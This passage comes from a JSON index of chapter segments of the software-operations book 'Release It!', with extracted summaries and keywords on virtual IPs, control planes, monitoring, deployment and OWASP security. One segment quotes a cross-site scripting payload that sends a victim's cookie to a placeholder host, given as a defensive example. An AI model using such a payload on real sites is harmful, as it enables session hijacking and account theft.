stack.\nThe following figure depicts a virtual IP address before and after the active node fails.\nThis kind of migratory IP address is often used for active/passive database clusters.\nClients connect only using the DNS name for the virtual IP address, not to the hostnames of either node in the cluster.\nThat way, no matter which node currently holds the IP address, the client can connect to the same name.\nTherefore, any application calling a database through a virtual IP should be prepared to get a SQLException when such a failover occurs.\nIn general, if your application calls any other service through a handoff virtual IP, it must be prepared for the possibility that the next TCP packet isn’t going to the same interface as the last packet.",
      "keywords": [
        "service",
        "time",
        "address",
        "load",
        "server",
        "network",
        "listen queue",
        "service discovery",
        "virtual",
        "queue",
        "TCP",
        "n’t",
        "application",
        "requests",
        "network interface"
      ],
      "concepts": [
        "service",
        "network",
        "time",
        "routing",
        "routes",
        "server",
        "load",
        "address",
        "addresses",
        "requests"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 17,
          "title": "",
          "score": 0.845,
          "base_score": 0.695,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 23,
          "title": "",
          "score": 0.7,
          "base_score": 0.55,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 8,
          "title": "",
          "score": 0.678,
          "base_score": 0.528,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 7,
          "title": "",
          "score": 0.668,
          "base_score": 0.518,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 10,
          "title": "",
          "score": 0.635,
          "base_score": 0.485,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "address",
          "ip",
          "ip address",
          "virtual ip",
          "virtual"
        ],
        "semantic": [],
        "merged": [
          "address",
          "ip",
          "ip address",
          "virtual ip",
          "virtual"
        ]
      },
      "topic_id": 1,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.30362298901331314,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246519+00:00"
      }
    },
    {
      "chapter_number": 25,
      "title": "Segment 25 (pages 200-207)",
      "start_page": 200,
      "end_page": 207,
      "summary": "That can be a big help, because some of the most powerful tools require operational support that makes them costly to support by a single team.\nNext, we continue zooming out to look at control over this whole extended mélange of application instances and infrastructure tools.\nIn the preceding chapters we worked our way up from bare metal through layers of abstraction and virtualization to create a sea of instances running on machines.\nThe control plane encompasses all the software and services that run in the background to make production load successful.\nOne way to think about it is this: if production user data passes through it, it’s production software.\nIf its main job is to manage other software, it’s the control plane.\nIf you can live with extended outages, or if it’s okay to find out your software is down by getting a call from the CEO, then you don’t need that part of the control plane.\nIn a more palatable example, you don’t need IP management software if you’re running a static network on physical hardware.\nControl Plane • 194\nThe more sophisticated your control plane becomes, the more it costs to implement and operate.\nIf you can amortize the cost of a platform team across hundreds of services deployed hundreds of times per year, then it makes a lot more sense.\nAt that time, automated provi- sioning of operating systems required either a large commercial package (six figures in license cost, six more in implementation cost) or a complete roll- your-own approach.\nAmazon clearly states that “[a]n authorized S3 team member using an established playbook executed a command which was intended to remove a small number of servers for one of the S3 subsystems that is used by the S3 billing process.\nThe administrative tools and playbooks allowed this error to happen.\n“System” here means the whole system—S3 plus the control plane software and human processes to manage it all.\nControl Plane • 196\n“While removal of capacity is a key operational practice, in this instance, the tool used allowed too much capacity to be removed too quickly.\nA common thread running through these outages is that the automation is not being used simply to enact the will of a human administrator.\nBut once we’re talking about shutting down more than 50 percent of total server capacity, the automation probably ought to pause for some human confirmation that this is really the right course of action.\nBy the time a human perceives the problem, it’s a question of recovery rather than intervention.\nThere’ll surely be a monitoring team within the platform team.\nIn other words, the monitoring team doesn’t do the monitoring, it provides the ability for others to do their own monitoring.\nFor example, it used to be common for the monitoring team to implement all the specific monitors, triggers, alerts, and thresholds.\nIt means they have to create a “request for monitoring” form for development teams to\nControl Plane • 198\nIf we respect the customer-centric model, then the monitoring team should not implement the actual monitors.\nTeam members should work one level removed: they implement the tools that let their customers implement their own monitors.\nIn other words, the monitoring team may need to build infrastructure to receive alerts, deployment tools that push their monitoring agents out (if applicable), or scripting tools that let developers provide a JSON description of the monitors they need.\nThe monitoring team offers up an interface that development teams can use.\nThe details of implementation are owned by the monitoring team and can change as long as they continue to support their contract.\nThe administrator should ideally be concerned with creating a high-performance, stable platform on which development teams can build any kind of database.\nThe platform team includes database administrators who keep the database running and healthy.\nThe picture is harder with SQL-based RDBMSs. It’s too easy for one application to make a harmful schema change that affects other consumers.\nIt’s not very resource-efficient, but it does unfreeze development teams to move indepen- dently, without a queue for DBA attention.\nDevelopment Is Production • 199\nKeep in mind that the goal for the platform team is to enable their customers.\nThe team should be trying to take themselves out of the loop on every day- to-day process and focus on building safety and performance into the platform itself.\nProbably a barely running mess full of old temp files, tarballs named after people, scripts that aren’t in version control and nobody’s quite sure if they’re still used, SSH keys from developers who left years ago...in short, a big ramshackle mess.\nDo you have high confidence that passing tests in QA means the software will work in production?\nMaybe your image of QA is a whole environment stamped out by the same automation tools that deploy to production, with an anonymized sample of production data from within the last week.\nQA doesn’t match produc- tion in topology or scale, and multiple dev teams are trying to get into QA but can’t because there’s only one environment.\nVirtualize them so every team can create its own on- demand QA environment.) In short, development environments are treated with utter disregard.\nThey build software that has to go into version control (a service), get constructed in CI (another service), tested in QA (a service), and stored in a repository (yet another service).\nWhen these services are down, developers can’t do their jobs.",
      "keywords": [
        "Control Plane",
        "team",
        "monitoring team",
        "control",
        "n’t",
        "Plane",
        "monitoring",
        "control plane software",
        "report erratum",
        "software",
        "platform team",
        "production",
        "service",
        "database",
        "automation"
      ],
      "concepts": [
        "operate",
        "operations",
        "operating",
        "operators",
        "human",
        "automated",
        "automation",
        "database",
        "developers",
        "amazon"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 19,
          "title": "",
          "score": 0.676,
          "base_score": 0.526,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 21,
          "title": "",
          "score": 0.644,
          "base_score": 0.494,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 1,
          "title": "",
          "score": 0.587,
          "base_score": 0.437,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 37,
          "title": "",
          "score": 0.57,
          "base_score": 0.42,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 27,
          "title": "",
          "score": 0.547,
          "base_score": 0.397,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "team",
          "monitoring team",
          "monitoring",
          "plane",
          "control plane"
        ],
        "semantic": [],
        "merged": [
          "team",
          "monitoring team",
          "monitoring",
          "plane",
          "control plane"
        ]
      },
      "topic_id": 0,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.3043224954844115,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246559+00:00"
      }
    },
    {
      "chapter_number": 26,
      "title": "Segment 26 (pages 208-215)",
      "start_page": 208,
      "end_page": 215,
      "summary": "The tools, services, and environments that developers need to do their jobs should be treated with production-level SLAs. The development platform is the production environment for the job of creating software.\nIt is hard to deduce whether users are receiving a good experience from indi- vidual instance metrics.\n(It would require a model of the whole system that accounts for circuit breakers, caches, fallbacks, and a pile of other implemen- tation details that change frequently.) Instead, the best way to tell if users are receiving a good experience is to measure it directly.\nMobile and web apps can have instrumentation that reports their timing and failures up to a central service.\nThat can take a lot of infrastructure, so you may consider a service such as New Relic or Datadog.3,4 If you are at a scale where it makes sense to run it yourself, on-premise software such as AppDy- namics or CA’s APM might be the thing for you.5,6 Some of these products also allow you to watch network traffic at the edge of your system, recording HTTP sessions for analysis or playback.\nYou don’t need to build infrastructure or configure monitoring software.\nThere may come a time when the fees become unpalatable, but the switching cost of moving to your own infrastructure is equally unpalatable.\nWhile removing the very visible monthly fees for a service, the open source approach has less-visible costs in the form of labor and infrastructure.\nHalf of the vendors at operations or software architecture conferences are in this space, so the names may change by the time you read this.\nReal-user monitoring is most useful to understand in terms of the current state and recent history.\nWe should build our transparency in terms of revealing the way that the recent past, current state, and future state connect to revenue and costs.\nIs some service in a revenue-generating process throwing exceptions in logs?\nCost comes from infrastructure, especially in these days of autoscaled, elastic, pay-as- you-go services.\nYou can improve the bottom line by moving crucial services to technology with a smaller footprint or faster processing.\nBefore you do, though, make sure it’s a service that makes a difference.\nIn other words, your feature that detects birds in photographs taken inside national parks may require a lot of CPU time; but if it only gets used once a month, it’s not material to your bottom line.\nAre there opportunities to increase the bottom line by optimizing services?\nThe idea of monitoring, log collection, alerting, and dashboarding as being about economic value more than technical availability may be unfamiliar.\nEven so, if you adopt this perspective, you’ll find that it is easy to make decisions about what to monitor, how much data to collect, and how to rep- resent it.\nThe “technical” perspective may even be split into “development” and “operations.” Most of the time, these constituencies look at different measure- ments collected by different means.\nImagine the difficulty in planning when marketing uses tracking bugs on web pages, sales uses conversions reported in a business intelligence tool, operations analyzes log files in Splunk, and development uses blind hope and intuition.\nIn Transparency, on page 162, we saw the importance of good logging and metrics generation at the microscopic scale.\nIn this mode, services just write their logs to local files.\nThat’s why metrics collectors often come with additional tools to take measurements on the instances.\nSecond, even if you guess right, the key metrics change over time.\nState of circuit breaker, number of timeouts, number of requests, average response time, number of good responses, number of network errors, number of protocol errors, number of application errors, actual IP address of the remote endpoint, current number of concurrent requests, concurrent request high-water mark\nItems in cache, memory used by cache, cache hit rate, items flushed by garbage collector, configured upper limit, time spent creating items\nFor continuous metrics, a handy rule-of-thumb definition for nominal would be “the mean value for this time period plus or minus two standard deviations.” The choice of time period is where it gets interesting.\nConfiguration Services\nConfiguration services like ZooKeeper and etcd are distributed databases that applications can use to coordinate their configuration.9,10 Configuration in this sense is more than just the static parameters that an instance would keep in .properties files.\nThe configuration services are themselves distributed databases.\nProvisioning and Deployment Services • 207\nThat means you can add and remove nodes, but response time will degrade as the nodes rebalance their data.\nKeep in mind that the configuration service suffers the same network trauma that every other application does.\nThere will be times that clients can’t reach the configuration service.\nWorse, there will be times when the nodes of the configuration service can’t reach each other but clients can reach the nodes.\nOtherwise, you have no choice but to shut down applications when the configuration service is partitioned.\nInformation doesn’t only need to flow from the service to client instances, either.\nBe somewhat careful with this, as the configuration services can sustain high read volume but have to go through some consensus mechanism for every write.\nIt’s OK to use these for relatively slowly changing configuration data, but they definitely don’t stand in for a log collection system.\nA few pointers about configuration services:\nMake sure your instances can start without the configuration service.\nMake sure your instances don’t stop working when configuration is\nProvisioning and Deployment Services\nIn Part III of this book, we look at how to design services and applications to be deployable.\nIn many organizations deploy- ment is ridiculously painful, so it’s a good place to start making life better.",
      "keywords": [
        "services",
        "system",
        "Number",
        "Configuration Services",
        "time",
        "Configuration",
        "n’t",
        "metrics",
        "Transparency",
        "line",
        "top line",
        "report erratum",
        "state",
        "instances",
        "software"
      ],
      "concepts": [
        "number",
        "services",
        "timing",
        "time",
        "users",
        "makes",
        "making",
        "configure",
        "configured",
        "configurations"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 2,
          "title": "",
          "score": 0.615,
          "base_score": 0.465,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 41,
          "title": "",
          "score": 0.536,
          "base_score": 0.386,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 12,
          "title": "",
          "score": 0.526,
          "base_score": 0.376,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 5,
          "title": "",
          "score": 0.496,
          "base_score": 0.346,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 4,
          "title": "",
          "score": 0.419,
          "base_score": 0.269,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "configuration",
          "services",
          "configuration services",
          "metrics",
          "configuration service"
        ],
        "semantic": [],
        "merged": [
          "configuration",
          "services",
          "configuration services",
          "metrics",
          "configuration service"
        ]
      },
      "topic_id": 2,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.2538506468220216,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246593+00:00"
      }
    },
    {
      "chapter_number": 27,
      "title": "Segment 27 (pages 216-223)",
      "start_page": 216,
      "end_page": 223,
      "summary": "A push-style tool uses SSH or another agent so a central server can reach out to run scripts on the target machines.\nIn contrast, pull-based deployment tools rely more on the machines to know their own roles.\nSoftware on the machine reaches out to a configuration service to grab the latest bits for its role.\nElastically scaled virtual machines or containers have ephemeral identities, so there’s no point in having a push-based tool maintain a mapping from machine identity to role—the machine identity will shortly disappear, never to be seen again!\nWith long-lived virtual machines or even physical hosts, push-based tools can be simpler to set up and administer.\nProduction builds need to be run on a clean build server using libraries with known provenance.\nRepeatable builds are important so code that works on your machine works in production, too.\nCommand and Control • 209\nCanary deployments are an important job of the build tooling.\nThe “canary” is a small set of instances that get the new build first.\nFor a period of time, the instances running the new build coexist with instances running the old build.\n(See Chapter 14, Handling Versions, on page 263, to enable peaceful coexistence.) If the canary instances behave oddly, or their metrics go south, then the build is not rolled out to the remaining population.\nAt a larger scale, the deployment tool needs to interact with another service to decide on placement.\nThat placement service will determine how many instances of a service to run.\nWhen you get to this scale, it’s probably time to look at the platform players.\nThat’s because your software needs to include a description of its needs and wants for the platform to provide (usually as a JSON or YAML file in the build artifacts.)\nLive control is only necessary if it takes your instances a long time to be ready to run.\nWhenever an instance needed to be modified, it would be simpler to just kill the instance and let the scheduler start a new one.\nIf your instances run in containers and get their configuration from a config- uration service, then that is exactly the world you live in.\nSadly, not every service is made of instances that start up so quickly.\nIn those cases, you need to look at ways to send control signals to running instances.\nNot every service will need all of these controls.\nDevelopers don’t trust operations to deploy the software and run the scripts correctly.\nOnce you’ve decided which controls to expose, there’s still the question of how to convey the operator’s intention out to the instances themselves.\nEach instance of a service would listen on a port for these requests.\nCommand and Control • 211\nFor one thing, it takes time to make the API call to each instance.\nMore likely, whatever script loops over those API calls will stall out partway through because some instance doesn’t respond.\nThat’s when it’s time to build a “command queue.” This is a shared message queue or pub/sub bus that all the instances can listen to.\nThe admin tool sends out a command that the instances then perform.\nGUIs slow down operations by forcing administrators to do the same manual process on each service or instance (there might be many) every time the process is needed.\nGiven a command line, operators can easily build a scaffolding of scripts, logging, and automated actions to keep your software happy.\nUse configuration, provisioning, and deployment services to gain leverage over larger or more dynamic systems.\nOnce the system is (somewhat) stabilized and problems are visible, build control mechanisms.\nThese should give you more precise control than just reconfiguring and restarting instances.\nA large system deployed to long-lived machines benefits more from control mechanisms than a highly dynamic environment will.\nThat also means that individual teams probably don’t have the capacity or authority to build their own platforms.\nWhen these platforms work well, it can be an amazingly smooth experience to deploy services.\nA single command can bundle up a JAR file or Python project with its runtime, build a virtual machine or container image, run it, and set up DNS for you.\nLog collection and search • Metrics collection and visualization • Deployment • Configuration service • Instance placement • Instance and system visualization • Scheduling • IP, overlay network, firewall, and route management • Autoscaler • Alerting and notification\nTo answer those, we need to collect information across instances and services.\nControl systems and configuration services allow us to instruct running instances to change their behavior.\nScheduling and deployment tools let us change the instance assortment dynamically as our internal and external environments shift.\nIn all these services, we need to understand that automation makes every- thing go faster.\nWe need to build safety mechanisms into the automation itself.",
      "keywords": [
        "build",
        "instances",
        "Control",
        "API",
        "Control Plane",
        "service",
        "platform",
        "machines",
        "platform players",
        "admin API",
        "tools",
        "n’t",
        "report erratum",
        "deployment tools",
        "Command"
      ],
      "concepts": [
        "build",
        "tools",
        "control",
        "controlled",
        "instances",
        "needs",
        "machines",
        "software",
        "services",
        "api"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 21,
          "title": "",
          "score": 0.717,
          "base_score": 0.567,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 37,
          "title": "",
          "score": 0.626,
          "base_score": 0.476,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 19,
          "title": "",
          "score": 0.62,
          "base_score": 0.47,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 31,
          "title": "",
          "score": 0.608,
          "base_score": 0.458,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 32,
          "title": "",
          "score": 0.56,
          "base_score": 0.41,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "instances",
          "build",
          "command",
          "control",
          "instance"
        ],
        "semantic": [],
        "merged": [
          "instances",
          "build",
          "command",
          "control",
          "instance"
        ]
      },
      "topic_id": 0,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.27196376512486214,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246628+00:00"
      }
    },
    {
      "chapter_number": 28,
      "title": "Segment 28 (pages 224-231)",
      "start_page": 224,
      "end_page": 231,
      "summary": "Since 2001, the OWASP Foundation has catalogued application security incidents and vulnerabilities.5 Its member organizations contribute data from real attacks, so these are real lessons rather than “what-if-isms.” One way that OWASP promotes application security awareness is through its OWASP Top 10 list.\n“Injection” is an attack on a parser or interpreter that relies on user-supplied input.\nOther databases are also vulnerable to injection attacks.\nIn general, if a service builds queries by bashing strings together and any of those strings come from a user, that service is vulnerable.\nAnother common vector for injection attacks is XML.\nOne XML-based attack is the XML external entity (XXE) injection.\nSQL injection and XXE are just two of the many ways user input can corrupt your service.\nFormat string attacks, “Eval injection,” XPATH injection...Injec- tion attacks have held their top spot on the OWASP Top 10 since 2010.\nIt can be as obvious as putting a session ID into URLs or as subtle as storing unsalted passwords in your user database.\nAt one time, it was common to use query parameters on URLs and hyperlinks to carry session IDs. Not only are those session IDs visible to every switch, router, and proxy server, they are also visible to humans.\nThousands of random users tried to use that same session.\nBut any session ID in plain text can be sniffed and duplicated by an attacker.\nThe attacker gains control of the user’s session.\nIt can still happen, however, even if the session ID is embedded in a cookie.\nSessions can also be compromised via cross-site scripting (XSS) attacks, which we’ll look at a little bit later.\nA variant of session hijacking is “session fixation.” An attacker goes to the vulnerable application and gets issued a valid session ID.\nsupplies the target with a link to the application with the attacker’s session ID in it.\n(It may be provided to the victim several ways, including client-side script or the META tag to set a cookie.) The receiving application accepts the session ID from the victim and generates a response within that session.\nFrom this point on, the victim uses a session that the attacker can access at any time.\nThe attacker expects the user to authenticate the session, which grants both the victim and the attacker full access.\nIf your session IDs are generated by any kind of predictable process, then your service may also be vulnerable to a “session prediction” attack.\nThis occurs when an attacker can guess or compute a session ID for a user.\nAny session IDs based on the user’s own data are definitely at risk.\nJust because a session ID looks random doesn’t mean that it is random, though.\nAny algorithm used by the server that generates the ID is probably open source and available for the attacker to download too.\nOWASP suggests the following guidelines for handling session IDs:\nUse a long session ID with lots of entropy.\nProtect against XSS to avoid script execution that would reveal session IDs.\nWhen a user authenticates, generate a fresh session ID.\nThat way, if a session fixation attack occurs, the attacker will not have access to the user’s account.\nUse cookies to exchange session IDs. Do not accept session IDs via other mechanisms.\nSome servers will emit session IDs in cookies but still accept them via query parameters.\n(Be honest, could you write a cURL command for a TLS-secured call to a development server using a self- signed certificate?) Consequently, we often write web services that use HTTP instead of HTTPS.\nUse “salt,” which is some random data added to the password to make dictionary attacks harder.\nDon’t allow attackers to make unlimited authentication attempts.\nCross-site scripting (XSS) happens when a service renders a user’s input directly into HTML without applying input escaping.\n<input type='text' value=''> <script>document.location='http://www.example.com/capture?id='+ document.cookie</script>'' />\nWhen the client’s browser hits the script tag in the middle, it makes a request over to www.example.com with the user’s cookie as a parameter, allowing the attacker to hijack the user’s session.\nA whole class of injection attacks aim at administrator or customer service GUIs. These attacks work through the browser.\nThe attacker injects script into your system, which then executes on your users’ browsers to attack a different party entirely.\nBroken access control refers to application problems that allow attackers to access data they shouldn’t.\nOne of the common forms of broken access control is “direct object access.” This happens when a URL includes something like a database ID as a query parameter.\nAn attacker sees the ID in the query parameter and starts probing for other numbers.\nSince database IDs are assigned sequentially, it’s easy for an attacker to scan for other interesting data.\nAn attacker can start trying other customer IDs to see what goods are en route.\nFirst, don’t use database IDs in URLs. We can generate unique but non-sequential identifiers to use in URLs. In that case, an attacker can probe the ID space but will have low odds of finding interesting results.\nYet another approach is to use a session-specific mapping from random IDs to real IDs. This uses more memory, but it avoids the extra storage needed for randomized IDs. When a user makes a request for http://www.example.com/pro- files/1990523, the service looks up that number in the session-scoped map.\nThis prevents attackers from probing for other users’ data.",
      "keywords": [
        "Session",
        "OWASP Top",
        "session IDs",
        "OWASP",
        "user",
        "OWASP SQL Injection",
        "attacker",
        "Injection",
        "SQL injection",
        "top",
        "IDs",
        "injection attacks",
        "n’t",
        "XML",
        "SQL Injection Prevention"
      ],
      "concepts": [
        "session",
        "sessions",
        "attacks",
        "user",
        "service",
        "data",
        "strings",
        "string",
        "authentication",
        "authenticate"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 29,
          "title": "",
          "score": 0.54,
          "base_score": 0.39,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 22,
          "title": "",
          "score": 0.393,
          "base_score": 0.243,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 15,
          "title": "",
          "score": 0.326,
          "base_score": 0.176,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 41,
          "title": "",
          "score": 0.311,
          "base_score": 0.311,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 6,
          "title": "",
          "score": 0.31,
          "base_score": 0.31,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "session",
          "ids",
          "attacker",
          "injection",
          "session id"
        ],
        "semantic": [],
        "merged": [
          "session",
          "ids",
          "attacker",
          "injection",
          "session id"
        ]
      },
      "topic_id": 4,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.2037845710545367,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246661+00:00"
      }
    },
    {
      "chapter_number": 29,
      "title": "Segment 29 (pages 232-239)",
      "start_page": 232,
      "end_page": 239,
      "summary": "Suppose your service responds with a “404 Not Found” when a caller requests a resource that doesn’t exist, but responds with a “403 Authentication Required” for a resource that exists but isn’t authorized.\nThen an attacker could find out how many customers you have by making requests for customer 1, 2, 3, and so on.\nOr, an attacker could probe your login service with different email addresses harvested from the web.\nAnother kind of broken access control leads to directory traversal attacks.\nWith just a few requests, a caller can find a way to the password file on the host.\nEven worse, when a request involves a file upload, the caller can overwrite any file the service is allowed to modify.\n(Yet another reason to not run as root!) Your application might think it’s saving the user’s profile picture, but it actually writes a malicious executable into the filesystem.\nDon’t build a path from the file- name in the request.\nThat way, the names in the filesystem stay under your service’s control and don’t include external input as any part.\nAttackers have entered applications, network devices, and databases by using the default, out-of-the-box admin login.\nAttackers took the data, wiped the database out, and replaced it with a demand for bitcoin.\nSecurity profes- sionals talk about the “attack surface,” meaning the sum of all IP addresses, ports, and protocols reachable to attackers.\nIt’s easy to build an attack for flaws in those sample apps.\nwww.mongodb.com/blog/post/how-to-avoid-a-malicious-attack-that-ransoms-your-data\nHackers don’t attack your strong points.\nMaybe your system uses TLS at the edge but REST over plain HTTP internally— another “pie crust.” An attacker can sniff the network to collect credentials and payload data.\nMake sure sensitive data is encrypted in the database.\nDecrypt data based on the user’s authorization, not the server’s.\nApplications can request data encryption keys, which they use to encrypt or decrypt data.\nIt should be safe from attackers.\nThey can make arbitrary requests.\nThat includes well-formed requests for unauthorized data, and it includes malformed requests aimed at compro- mising the service itself.\nThey do not block callers that issue too many bad requests.\nThat allows an attacking program to keep making calls, either to probe for weaknesses or extract data.\nThat leaves the attacker free to keep issuing requests.\nThe service should log bad requests by source principal.\nIn the case of an attack, it slows the rate of data compro- mise, thereby limiting the damage.\nNetwork devices may help if your service is in a data center under your control.\nCross-site request forgery (CSRF) used to be a bigger issue than it is now.\nA CSRF attack starts on another site.\nAn attacker uses a web page with JavaScript, CSS, or HTML that includes a link to your system.\nWhen the hapless user’s browser accesses your system, your system thinks it’s a valid request from that user.\nJust because the user appears to have a logged-in session doesn’t mean the request is intentional.\nThe first thing to do is make sure your site can’t be used to launch CSRF attacks.\nIf the attacker can supply input that you display without proper escaping, the attacker can trick people into viewing it through your site.\nSecond, make sure that requests with side effects—such as password changes, mailing address updates, or purchases—use anti-CSRF tokens.\nA top-level navigation request (an in-bound link from another system) on a new page is not a same- site request when the cookie says “strict.”\nBeware of an attack that allows remote code execu- tion.19 That’s what got Equifax.\nSadly, most successful attacks are not the exciting “zero day, rush to patch before they get it” kind of thing that makes those cringe-worthy scenes in big budget thrillers.\nThey can also have vulnerabilities.) Keep that report someplace and check it once a week against the latest CVEs. Better yet, use a build tool plugin that automatically breaks the build if there’s a CVE against any of your dependencies.20 If that’s too much work, you can sign up for a commercial service like VersionEye.21\nwww.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet 19.\nIt’s essential to make sure that APIs are not misused.\nWell, attack tools are also programs.\nIf an attack tool presents the right credentials and access tokens, it’s indistinguishable from a legitimate user.\nIf the attacker can use those to get other customers’ data, that’s catastrophic.\nAPIs must ensure that malicious requests cannot access data the original user would not be able to see.\nThe upshot is that the API has to authorize the link on the way out and then reauthorize the request that comes back in.\nSecond, your API should use the most secure means available to communicate.\nUse a generative testing library to feed it tons and tons of bogus input to make sure it rejects the input or fails in a safe way.\nOnce an attacker has cracked the shell to get root access, the only way to be sure the server is safe is to reformat and reinstall.\nTo further contain vulnerabilities, each major application should have its own user.\nAt that point, the container has its own fairly large attack surface.",
      "keywords": [
        "n’t",
        "requests",
        "data",
        "service",
        "request",
        "Security",
        "API",
        "APIs",
        "user",
        "attack",
        "report erratum",
        "make",
        "OWASP Top",
        "system",
        "report"
      ],
      "concepts": [
        "attacker",
        "data",
        "security",
        "secure",
        "user",
        "requests",
        "request",
        "application",
        "applications",
        "uses"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 15,
          "title": "",
          "score": 0.624,
          "base_score": 0.474,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 28,
          "title": "",
          "score": 0.54,
          "base_score": 0.39,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 22,
          "title": "",
          "score": 0.407,
          "base_score": 0.257,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 30,
          "title": "",
          "score": 0.381,
          "base_score": 0.381,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 38,
          "title": "",
          "score": 0.361,
          "base_score": 0.361,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "attack",
          "attacker",
          "csrf",
          "data",
          "requests"
        ],
        "semantic": [],
        "merged": [
          "attack",
          "attacker",
          "csrf",
          "data",
          "requests"
        ]
      },
      "topic_id": 4,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.23969839318102037,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246698+00:00"
      }
    },
    {
      "chapter_number": 30,
      "title": "Segment 30 (pages 240-247)",
      "start_page": 240,
      "end_page": 247,
      "summary": "secured.\nAs a result, a containerized application may still have operating system vulnerabilities that IT patched days or weeks ago.\nYou need an automated build process that creates new images from an upstream base and your local application code.\nBe sure to configure timed builds for any application that isn’t still under active development, though.\nPasswords are the Brazil nut of application security; every mix has them, but nobody wants to deal with them.\nThere’s obviously no way that somebody can interactively key in passwords every time an application server starts up.\nTherefore, database passwords and credentials needed to authenticate to other systems must be configured in persistent files somewhere.\nAs soon as a password is in a text file, it is vulnerable.\nThese passwords must be protected with the highest level of security achievable.\nAt the absolute minimum, passwords to production databases should be kept separate from any other configuration files.\n(I’ve seen operations zip up the entire installation folder and ship it back to development for analysis, for example, during a support incident.) Files containing passwords should be made readable only to the owner, which should be the application user.\nIf the application is written in a language that can execute privilege separation, then it’s reasonable to have the application read the password files before downgrad- ing its privileges.\nPassword vaulting keeps passwords in encrypted files, which reduces the security problem to that of securing the single encryption key rather than securing multiple text files.\nThis can assist in securing the 